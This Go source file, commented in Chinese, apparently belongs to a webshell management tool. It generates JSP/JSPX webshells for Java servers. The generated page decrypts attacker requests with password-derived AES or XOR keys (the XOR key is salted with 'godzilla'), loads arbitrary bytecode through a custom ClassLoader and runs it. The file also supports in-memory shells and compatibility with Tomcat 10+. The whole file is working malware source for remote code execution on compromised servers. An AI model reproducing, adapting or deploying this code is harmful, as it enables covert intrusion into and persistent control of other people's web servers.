package webshell

// carrier_java.go — Java 动态载荷的服务端载体（JSP/JSPX）与 wire 协议。
//
// 与既有 jsp shell 的区别：
//   既有模板把「JS 源码」塞给 Nashorn 引擎现编现跑，要求目标 JVM 带 JS 引擎
//   （JDK 15+ 已移除 Nashorn，只能靠 jar 依赖续命），且每次都要传输整段源码。
//   本载体只接收「字节码 + 操作名 + 参数」，用自定义 ClassLoader 直接 defineClass，
//   反射调用 forang.Payload.run(op, args)。目标端不需要任何脚本引擎，也不需要
//   编译环境；载荷能力由服务端编译期决定，改功能不用重新部署 shell。
//
// wire 格式（大端，全部在解密之后）：
//   "FJ1"              3 字节魔数，防止把普通请求喂进来
//   u16 + 类名          forang.Payload
//   u16 + 操作名        exec / info / ping
//   u16 arg 个数
//     每个 arg：u32 长度 + UTF-8 字节（命令里可能带换行，所以不能拿分隔符拼）
//   u32 + class 字节
//
// 载体侧把 Class 缓存在 application 作用域（键=class 字节的 MD5）：同一个 shell
// 反复调用时不会每次新建 ClassLoader，避免长跑容器 Metaspace 缓慢泄漏。

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
)

// javaWireMagic 载荷魔数；改动必须同步 carrier 模板里的三个字节比较。
const javaWireMagic = "FJ1"

// javaPayloadClassName 与服务端 Java 源码的包名类名一致。
const javaPayloadClassName = "forang.Payload"

// BuildJavaWire 组装载体请求体（明文，加密由 Encoder 负责）。
func BuildJavaWire(className, op string, args []string, class []byte) ([]byte, error) {
	if className == "" || op == "" {
		return nil, errors.New("java wire: 类名与操作名不能为空")
	}
	if len(class) == 0 {
		return nil, errors.New("java wire: class 字节为空")
	}
	out := make([]byte, 0, 3+2+len(className)+2+len(op)+2+len(class)+16)
	out = append(out, javaWireMagic...)
	out = appendU16(out, len(className))
	out = append(out, className...)
	out = appendU16(out, len(op))
	out = append(out, op...)
	if len(args) > 0xFFFF {
		return nil, errors.New("java wire: 参数过多")
	}
	out = appendU16(out, len(args))
	for _, a := range args {
		out = appendU32(out, len(a))
		out = append(out, a...)
	}
	out = appendU32(out, len(class))
	out = append(out, class...)
	return out, nil
}

// ParseJavaWire 反向解析，供测试与审计使用（载体侧是 Java 实现的同款解析）。
func ParseJavaWire(b []byte) (className, op string, args []string, class []byte, err error) {
	if len(b) < 3 || string(b[:3]) != javaWireMagic {
		return "", "", nil, nil, errors.New("java wire: 魔数不符")
	}
	p := 3
	className, err = readU16Str(b, &p)
	if err != nil {
		return
	}
	op, err = readU16Str(b, &p)
	if err != nil {
		return
	}
	argc, err := readU16(b, &p)
	if err != nil {
		return
	}
	args = make([]string, 0, argc)
	for i := 0; i < argc; i++ {
		var s string
		s, err = readU32Str(b, &p)
		if err != nil {
			return
		}
		args = append(args, s)
	}
	class, err = readU32Bytes(b, &p)
	return
}

func appendU16(b []byte, v int) []byte { return binary.BigEndian.AppendUint16(b, uint16(v)) }
func appendU32(b []byte, v int) []byte { return binary.BigEndian.AppendUint32(b, uint32(v)) }

func readU16(b []byte, p *int) (int, error) {
	if *p+2 > len(b) {
		return 0, errors.New("java wire: 截断（u16）")
	}
	v := int(binary.BigEndian.Uint16(b[*p:]))
	*p += 2
	return v, nil
}

func readU16Str(b []byte, p *int) (string, error) {
	n, err := readU16(b, p)
	if err != nil {
		return "", err
	}
	if *p+n > len(b) {
		return "", errors.New("java wire: 截断（字符串）")
	}
	s := string(b[*p : *p+n])
	*p += n
	return s, nil
}

func readU32Str(b []byte, p *int) (string, error) {
	raw, err := readU32Bytes(b, p)
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

func readU32Bytes(b []byte, p *int) ([]byte, error) {
	if *p+4 > len(b) {
		return nil, errors.New("java wire: 截断（u32）")
	}
	n := int(binary.BigEndian.Uint32(b[*p:]))
	*p += 4
	if n < 0 || *p+n > len(b) {
		return nil, errors.New("java wire: 截断（载荷）")
	}
	out := b[*p : *p+n]
	*p += n
	return out, nil
}

// ---------- JSP 载体模板 ----------

// javaCarrierDecl 载体公共声明：wire 读取器 + MD5 + ClassLoader。
// 放在 <%@ page %><%! ... %> 里，模板文本零输出（否则响应会多出空白字节）。
const javaCarrierDecl = `<%@ page import="java.util.*,java.lang.reflect.*,java.security.*,javax.crypto.*,javax.crypto.spec.*" %><%!
    static int u16(byte[] d, int[] p) {
        int v = ((d[p[0]] & 0xff) << 8) | (d[p[0] + 1] & 0xff);
        p[0] += 2;
        return v;
    }
    static int u32(byte[] d, int[] p) {
        int v = ((d[p[0]] & 0xff) << 24) | ((d[p[0] + 1] & 0xff) << 16) | ((d[p[0] + 2] & 0xff) << 8) | (d[p[0] + 3] & 0xff);
        p[0] += 4;
        return v;
    }
    static String str(byte[] d, int[] p) throws Exception {
        int n = u16(d, p);
        String s = new String(d, p[0], n, "UTF-8");
        p[0] += n;
        return s;
    }
    static String str32(byte[] d, int[] p) throws Exception {
        int n = u32(d, p);
        String s = new String(d, p[0], n, "UTF-8");
        p[0] += n;
        return s;
    }
    static byte[] bin(byte[] d, int[] p) {
        int n = u32(d, p);
        byte[] b = new byte[n];
        System.arraycopy(d, p[0], b, 0, n);
        p[0] += n;
        return b;
    }
    static String md5(byte[] b) throws Exception {
        byte[] h = MessageDigest.getInstance("MD5").digest(b);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < h.length; i++) {
            String x = Integer.toHexString(h[i] & 0xff);
            if (x.length() == 1) { sb.append('0'); }
            sb.append(x);
        }
        return sb.toString();
    }
    static class FL extends ClassLoader {
        FL() { super(Thread.currentThread().getContextClassLoader()); }
        Class<?> def(String name, byte[] b) { return defineClass(name, b, 0, b.length); }
    }
%>`

// javaCarrierBody 主体：读 body → 解密（javaCarrierDecrypt 注入）→ 解析 wire → 加载执行。
//
// 读请求体刻意声明成 java.io.InputStream 而不是 javax.servlet.ServletInputStream：
// Tomcat 10 起容器 API 换成 jakarta.servlet，写死 javax 类型会让载体在 Tomcat 10+
// 直接编译失败。getInputStream() 的返回值在 javax / jakarta 两套 API 下都能赋给
// InputStream，用父类型即可同时兼容。
const javaCarrierBody = `<%try {
    java.io.InputStream in = request.getInputStream();
    java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
    byte[] buf = new byte[8192];
    int n;
    while ((n = in.read(buf)) > 0) { bo.write(buf, 0, n); }
    byte[] d = Base64.getDecoder().decode(bo.toByteArray());
{{DECRYPT}}
    if (d.length < 5 || d[0] != 'F' || d[1] != 'J' || d[2] != '1') { out.print("ERROR:bad wire magic"); return; }
    int[] p = new int[]{3};
    String cn = str(d, p);
    String op = str(d, p);
    int argc = u16(d, p);
    String[] args = new String[argc];
    for (int i = 0; i < argc; i++) { args[i] = str32(d, p); }
    byte[] cb = bin(d, p);

    java.util.Map cache = (java.util.Map) application.getAttribute("__fjm");
    if (cache == null) {
        cache = new java.util.concurrent.ConcurrentHashMap();
        application.setAttribute("__fjm", cache);
    }
    String key = md5(cb);
    Class c = (Class) cache.get(key);
    if (c == null) {
        c = new FL().def(cn, cb);
        cache.put(key, c);
    }
    Method m = c.getMethod("run", new Class[]{String.class, String[].class});
    // 把 JSP 上下文交给载荷：内存马要拿 ServletContext 才能找到 StandardContext。
    // 用反射探测，老版本载荷没有 attach 方法时静默跳过（向后兼容）。
    try {
        Method at = c.getMethod("attach", new Class[]{Object.class, Object.class});
        at.invoke(null, new Object[]{request, application});
    } catch (NoSuchMethodException ignore) {}
    Object r = m.invoke(null, new Object[]{op, args});
    out.print(r == null ? "" : r.toString());
} catch (Throwable t) {
    String msg = t.getMessage();
    out.print("ERROR:" + t.getClass().getName() + (msg == null ? "" : ": " + msg));
}%>`

// 三种解密片段。key 派生必须与 encoders.go 完全一致：
//
//	aes: md5(password) hex[:16] 的 ASCII 字节，作为 key 与 iv
//	xor: md5(password+"godzilla") hex[:16] 的 ASCII 字节，循环异或
const (
	javaDecryptRaw = ``
	javaDecryptAes = `    String k = md5("{{PASSWORD}}".getBytes("UTF-8")).substring(0, 16);
    byte[] kb = k.getBytes("UTF-8");
    Cipher ci = Cipher.getInstance("AES/CBC/PKCS5Padding");
    ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec(kb, "AES"), new IvParameterSpec(kb));
    d = ci.doFinal(d);`
	javaDecryptXor = `    String k = md5("{{PASSWORD}}godzilla".getBytes("UTF-8")).substring(0, 16);
    byte[] kb = k.getBytes("UTF-8");
    for (int i = 0; i < d.length; i++) { d[i] = (byte) (d[i] ^ kb[i % 16]); }`
)

// GenerateJavaCarrier 生成 Java 动态载荷的 JSP/JSPX 载体源码。
// 只有 jsp/jspx 有意义：字节码加载依赖 java.*，asp/aspx/php 无此能力。
func GenerateJavaCarrier(scriptType, encoder, password string) (string, error) {
	return GenerateJavaCarrierOpts(scriptType, encoder, password, GateOpts{})
}

// GenerateJavaCarrierOpts 生成 + Header Gate。
func GenerateJavaCarrierOpts(scriptType, encoder, password string, gate GateOpts) (string, error) {
	var dec string
	switch encoder {
	case "raw", "":
		dec = javaDecryptRaw
	case "aes":
		dec = javaDecryptAes
	case "xor":
		dec = javaDecryptXor
	default:
		return "", fmt.Errorf("java 载体不支持 %s 加密（支持 raw/aes/xor）", encoder)
	}
	if scriptType != "jsp" && scriptType != "jspx" {
		return "", fmt.Errorf("java 载体只支持 jsp/jspx（收到 %s）", scriptType)
	}
	if strings.TrimSpace(password) == "" {
		return "", errors.New("java 载体需要连接密码")
	}
	body := strings.ReplaceAll(javaCarrierBody, "{{DECRYPT}}", dec)
	body = strings.ReplaceAll(body, "{{PASSWORD}}", escapeJavaString(password))
	code := javaCarrierDecl + body
	if scriptType == "jspx" {
		code = jspxWrap(code)
	}
	if gp := strings.TrimRight(gatePrefix(scriptType, gate), "\n"); gp != "" {
		// gate 片段末尾的换行会在响应里多出一个空行，去掉
		code = gp + code
	}
	return code, nil
}

// escapeJavaString 把密码塞进 Java 字符串字面量前做转义。
// 既有模板直接字符串替换，密码里带引号/反斜杠就会编译失败——这里修掉。
func escapeJavaString(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '"':
			b.WriteString(`\"`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}
